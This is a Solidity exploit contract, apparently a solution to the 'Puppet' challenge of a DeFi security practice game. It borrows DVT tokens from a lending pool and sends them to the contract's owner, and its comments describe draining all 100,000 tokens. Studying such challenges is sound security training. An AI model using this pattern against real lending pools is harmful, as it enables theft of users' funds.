// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.11;
// interface to interact with the puppet contract

import {Ipuppet} from "./Interfaces/IPuppet.sol";
// interface to interact with ERC20 tokens DVT 
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";



contract PuppetAttack {

    // constructor intiializing the puppet contract, owner of contract, and dvt token
    Ipuppet internal puppetPool;
    IERC20 internal dvt; 
    address payable owner; 

    error NotOwner();

    modifier onlyOwner {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    constructor(address _puppetPoolAddress, address _dvtAddress){
        puppetPool = Ipuppet(_puppetPoolAddress);
        dvt = IERC20(_dvtAddress);
        owner = payable(msg.sender);
    }

    
    function performAttack(uint256 amountToDrain) public payable onlyOwner{
        // an approval needs to be given to this contract just before this attack is performed
        // dvt.transferFrom(msg.sender, address(this), amountToDrain);

        // dvt.approve(address(puppetPool), amountToDrain);

        puppetPool.borrow{value: msg.value}(amountToDrain);

        dvt.transfer(owner, amountToDrain);
    }

    receive() external payable {}
    // payabe functtion that performs attack by 
        // sending this contract the ERC20 DVT tokens AND ETH 
        // this contract interacts with the pool contract 
        // this contract burrows the amount 
        // this contract sends all 100,000 tokens back to the owner

}